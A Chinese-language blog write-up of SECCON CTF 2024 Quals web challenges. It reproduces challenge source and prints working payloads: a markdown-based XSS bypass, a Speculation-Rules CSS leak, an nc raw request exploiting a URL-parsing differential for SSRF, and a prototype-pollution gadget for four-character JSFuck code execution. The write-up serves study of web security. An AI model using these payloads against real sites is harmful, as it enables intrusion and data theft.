---
date: '2024-12-21T17:56:15+08:00'
draft: false
title: Seccon CTF 2024 Quals
tags: [CTF]
---

## Tanuki Udon

### challenge description

标准的前端题，给一个 note 网站，flag 在某个 note 里，目标是拿到 flag 的 note id。

创建的 note 内容会被当作 markdown 处理，特殊字符会被转义：

```js
app.post('/note', (req, res) => {
  const { title, content } = req.body;
  req.user.addNote(db.createNote({ title, content: markdown(content) }));
  res.redirect('/');
});
```

```js
const escapeHtml = (content) => {
  return content
    .replaceAll('&', '&amp;')
    .replaceAll(`"`, '&quot;')
    .replaceAll(`'`, '&#39;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;');
}

const markdown = (content) => {
  const escaped = escapeHtml(content);
  return escaped
    .replace(/!\[([^"]*?)\]\(([^"]*?)\)/g, `<img alt="$1" src="$2"></img>`)
    .replace(/\[(.*?)\]\(([^"]*?)\)/g, `<a href="$2">$1</a>`)
    .replace(/\*\*(.*?)\*\*/g, `<strong>$1</strong>`)
    .replace(/  $/mg, `<br>`);
}
```

bot 可以接受任意 url，三方站也可以：

```js
app.post("/api/report", async (req, res) => {
  const { url } = req.body;
  if (
    typeof url !== "string" ||
    (!url.startsWith("http://") && !url.startsWith("https://"))
  ) {
    return res.status(400).send("Invalid url");
  }

  try {
    await visit(url);
    return res.sendStatus(200);
  } catch (e) {
    console.error(e);
    return res.status(500).send("Something wrong");
  }
});
```

比较特别的是，可以设置一个 header，除了 `content-xxx`

```js
app.use((req, res, next) => {
  if (typeof req.query.k === 'string' && typeof req.query.v === 'string') {
    // Forbidden :)
    if (req.query.k.toLowerCase().includes('content')) return next();

    res.header(req.query.k, req.query.v);
  }
  next();
});
```

题目信息里说

> Inspired by Udon (TSG CTF 2021)



### 非预期 - XSS

注意到 `markdown` 函数中会构造出 img 和 a 标签，而且会先构造 img，导致可以利用 a 标签的构造替换 img 标签中的内容，闭合双引号，从而达到构造 img 标签属性的效果：

```plain
![[aaa](xxx)]( src=1 onerror=alert`1` foo=)
```

以上内容经过 markdown 函数处理后会变成：

```html
<img alt="<a href=" src=1 onerror=alert`1` foo=">aaa" src="xxx"></img></a>
```

这样就可以造出一个 XSS，虽然是有限制的，比如 payload 里不能带括号，不过可以用 `docuemnt.wite` 再来一次 XSS。

```js
document.write`\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x31\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x22\x61\x6c\x65\x72\x74\x28\x31\x29\x22\x3e`
// <img src=1 onerror="alert(1)">
```



### 预期 - XSLeak via Speculation Rules

考虑设置 header 的功能：

- 如果可以设置任意 header，可以用 CSP report + CSS selector
- 按照 Udon (TSG CTF 2021) 中的做法，用 `Link` header 注入 CSS，再利用 selector 做 leak，但要求环境是 Firefox

按照题目的意思，应该是要找 Chrome 下也能用的 header，作者给出的答案是 `Speculation-Rules`, 可以用于设置 [Speculation Rules](https://developer.mozilla.org/en-US/docs/Web/API/Speculation_Rules_API) 。

利用 CSS selector 可以很容易构造出 leak pattern，难点是如何 report。考虑到可以 CSRF，可以给 bot 创建一些 note，note 的内容是可控的，且可以包含图片，将图片的 src 设成 report end 可以检测 note 是否被加载，所以可以利用 note 的 prerender 做 leak oracle。

如何根据 flag note 对应 a 标签的 href 属性 prerender 不同的 note？可以利用 `:has` selector：

```css
ul:has(li:first-child a[href^="/note/{prefix}"]) li:nth-last-child(1) a
```

匹配上就会 prerender 指定位置的 note，note的顺序也是可控的，完整 Speculation Rules 如下：

```json
{
    "prerender": [
        {
            "eagerness": "immediate",
            "where": {
                "selector_matches": [
                    "ul:has(li:first-child a[href^=\"/note/xxx\"]) li:nth-last-child(1) a"
                ]
            }
        }
    ]
}
```



### reference

https://satoooon1024.hatenablog.com/entry/2024/12/02/XS-Leaks_through_Speculation-Rules_-_SECCON_CTF_13_Author%27s_Writeup_%28_Tanuki_Udon_%29

https://diary.shift-js.info/tsgctf-2021-udon/



## Self-SSRF

### challenge description

题面非常简单，用 bun 起一个 express server：

```js
import express from "express";

const PORT = 3000;
const LOCALHOST = new URL(`http://localhost:${PORT}`);
const FLAG = Bun.env.FLAG!!;

const app = express();

app.use("/", (req, res, next) => {
  if (req.query.flag === undefined) {
    const path = "/flag?flag=guess_the_flag";
    res.send(`Go to <a href="${path}">${path}</a>`);
  } else next();
});

app.get("/flag", (req, res) => {
  res.send(
    req.query.flag === FLAG // Guess the flag
      ? `Congratz! The flag is '${FLAG}'.`
      : `<marquee>🚩🚩🚩</marquee>`
  );
});

app.get("/ssrf", async (req, res) => {
  try {
    const url = new URL(req.url, LOCALHOST);
    console.log(url)

    if (url.hostname !== LOCALHOST.hostname) {
      res.send("Try harder 1");
      return;
    }
    if (url.protocol !== LOCALHOST.protocol) {
      res.send("Try harder 2");
      return;
    }

    url.pathname = "/flag";
    url.searchParams.append("flag", FLAG);
    res.send(await fetch(url).then((r) => r.text()));
  } catch {
    res.status(500).send(":(");
  }
});

app.listen(PORT, () => {
  console.log('listen on', PORT)
});
```

ssrf 访问 /flag 可以拿到 flag，虽然要求 flag param 和 flag 值，但是 /ssrf 路由会将 flag 值 append 到 url 的参数里，加上访问时必须手动设置 flag 参数，所以难点是让 `new URL()` 在构造后忽略之前手动设置的 flag 参数。



### 非预期 - 利用 qs 的解析逻辑

express 解析 url 用的是 qs，所以直接在 qs 里找对应的逻辑：https://github.com/ljharb/qs/blob/v6.13.1/lib/parse.js#L55

注意到在处理 url 中的 `[]` 时，会先进行一次 url encode 的替换：

```js
var parseValues = function parseQueryStringValues(str, options) {
    var obj = { __proto__: null };

    var cleanStr = options.ignoreQueryPrefix ? str.replace(/^\?/, '') : str;
    cleanStr = cleanStr.replace(/%5B/gi, '[').replace(/%5D/gi, ']');
    var limit = options.parameterLimit === Infinity ? undefined : options.parameterLimit;
    var parts = cleanStr.split(options.delimiter, limit);
    var skipIndex = -1; // Keep track of where the utf8 sentinel was found
    var i;

    ...

    for (i = 0; i < parts.length; ++i) {
        if (i === skipIndex) {
            continue;
        }
        var part = parts[i];

        var bracketEqualsPos = part.indexOf(']=');
        var pos = bracketEqualsPos === -1 ? part.indexOf('=') : bracketEqualsPos + 1;
        
        // ...
    }

    return obj;
};
```

但是这次替换只针对 `[]`，但是不针对 `=` 等其他字符。

而 js 中的 `URL` 类型是不会对 `[]` 做特殊处理的，会将其视为 param key 的一部分：

```js
const LOCALHOST = new URL(`http://localhost:3000`);
const url = new URL('/ssrf?flag[a]=1', LOCALHOST);
console.log(url.searchParams)
// URLSearchParams { 'flag[a]' => '1' }
```

在 append 新的 param 后，`URL` 会将对 param 进行 urlencode：

```js
const LOCALHOST = new URL(`http://localhost:3000`);
const url = new URL('/ssrf?flag[a]=1', LOCALHOST);
url.searchParams.append("flag", 'flag{test}');
console.log(url.toString());
// http://localhost:3000/ssrf?flag%5Ba%5D=1&flag=flag%7Btest%7D
```

所以可以构造 `flag[=]=1`：

- qs 会将其解释为 `flag: { "=": "1" }`
- 而 `URL` 会将其解析为 `URLSearchParams { 'flag[' => ']=1' }`，然后 urlencode 为 `flag%5B=%5D%3D1`
- qs 再次解析时会变成  `flag[=]%3D1`, 此时找不到 `]=`，key 就变成了 `flag[`



### 预期 - 利用 express 对 url query 的解析

express 解析 url 时，会先调用 parseurl 库拿到 querystring，然后再把 querystring 送进 qs：

https://github.com/expressjs/express/blob/4.x/lib/middleware/query.js

```js
// ...
var parseUrl = require('parseurl');
var qs = require('qs');
// ...
module.exports = function query(options) {
  var opts = merge({}, options)
  var queryparse = qs.parse;
  //...
  return function query(req, res, next){
    if (!req.query) {
      var val = parseUrl(req).query;
      req.query = queryparse(val, opts);
    }
    
    next();
  };
};
```

qs 又会调用 require 到的 url 库：https://github.com/pillarjs/parseurl/blob/1.3.3/index.js

```js
var url = require('url')
var parse = url.parse
// ...

function parseurl (req) {
  var url = req.url
  // ...
  parsed = fastparse(url)
  parsed._raw = url

  return (req._parsedUrl = parsed)
};

function fastparse (str) {
  if (typeof str !== 'string' || str.charCodeAt(0) !== 0x2f /* / */) {
    return parse(str)
  }
  // ...
}
```

在 bun 的实现里，url.parse 会对 url 做 trim：https://github.com/oven-sh/bun/blob/main/src/js/node/url.ts#L133

```js
Url.prototype.parse = function (url, parseQueryString, slashesDenoteHost) {
  if (typeof url !== "string") {
    throw new TypeError("Parameter 'url' must be a string, not " + typeof url);
  }

  var queryIndex = url.indexOf("?"),
    splitter = queryIndex !== -1 && queryIndex < url.indexOf("#") ? "?" : "#",
    uSplit = url.split(splitter),
    slashRegex = /\\/g;
  uSplit[0] = uSplit[0].replace(slashRegex, "/");
  url = uSplit.join(splitter);

  var rest = url;

  /*
   * trim before proceeding.
   * This is to support parse stuff like "  http://foo.com  \n"
   */
  rest = rest.trim();
  // ...
}
```

但是 bun 的 http 实现会将非空格（0x20）的字符均视为 url 的一部分（具体细节此处略去）。

所以如果发送类似 `GET /ssrf?flag<trimmable> HTTP/1.1` 的流量，`<trimmable>` 的部分会被去掉，query 中会有 flag，而在利用 `req.url` 构造新 url 的时候，`<trimmable>` 部分会被保留，query 中的变量为 `flag<trimmable>`, 这样就可以做到在 ssrf 的时候忽略掉之前设置的 flag 参数。

可以用简单验证一下：

```js
const url = require('url');
let parsed = url.parse(decodeURIComponent('/ssrf?flag%C2%A0'))
console.log(parsed.query)
// flag
```

这里要注意不能直接用 `'/ssrf?flag\xC2\xA0'`，`\xC2\xA0` 是两个字符，而 `decodeURIComponent('%C2%A0')` 是一个字符。

```js
let s1 = decodeURIComponent('/ssrf?flag%C2%A0')
console.log(s1, s1.length)
// /ssrf?flag  11
let s2 = '/ssrf?flag\xC2\xA0'
console.log(s2, s2.length)
// /ssrf?flagÂ  12
```

用 nc 发送请求：

```bash
echo 'GET /ssrf?flag\xC2\xA0 HTTP/1.1\r\nHost: localhost:3000\r\n\r\n' | nc 127.0.0.1 3000 -v
```

除了 `\xC2\xA0`，还有很多其他可以用的字符，参考 https://en.wikipedia.org/wiki/Whitespace_character



## pp4

### challenge description

```js
#!/usr/local/bin/node
const readline = require("node:readline/promises");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

const clone = (target, result = {}) => {
  for (const [key, value] of Object.entries(target)) {
    if (value && typeof value == "object") {
      if (!(key in result)) result[key] = {};
      clone(value, result[key]);
    } else {
      result[key] = value;
    }
  }
  return result;
};

(async () => {
  // Step 1: Prototype Pollution
  const json = (await rl.question("Input JSON: ")).trim();
  console.log(clone(JSON.parse(json)));

  // Step 2: JSF**k with 4 characters
  const code = (await rl.question("Input code: ")).trim();
  if (new Set(code).size > 4) {
    console.log("Too many :(");
    return;
  }
  console.log(eval(code));
})().finally(() => rl.close());
```

题面也非常简单，给一个原型链污染，然后用 4 种字符的 jsfuck 做任意代码执行。

jsfuck 一般需要 6 种字符，所以题目在考如何利用原型链污染构造 gadget。

### solution

在正常情况下，用 jsfuck 构造任意代码执行只需要：

```js
[]["filter"]["constructor"]("console.log(123)")()
```

字符串是可以用原型链中的属性来获取的，除了字符串，还需要 `[]()` 刚好四种字符。

考虑到 `[][[]] == undefined`, 可以构造如下原型链：

```js
[].__proto__.undefined = {
    "undefined": 'filter',
    'filter': 'constructor',
    'constructor': 'console.log(123)'
};
// "undefined" == [][[]]
// "filter" == []["undefined"]["undefined"]
// "constructor" == []["undefined"]["undefined"]["filter"]
// eval_code == []["undefined"]["undefined"]["filter"]["constructor"]
```

这样就可以用 `[]` 两种字符表示需要的字符串了。

> 注意不能对 `[].__proto__` 直接赋值，只能修改其属性。



## Go to Jail



## double-parser



## JavaScrypto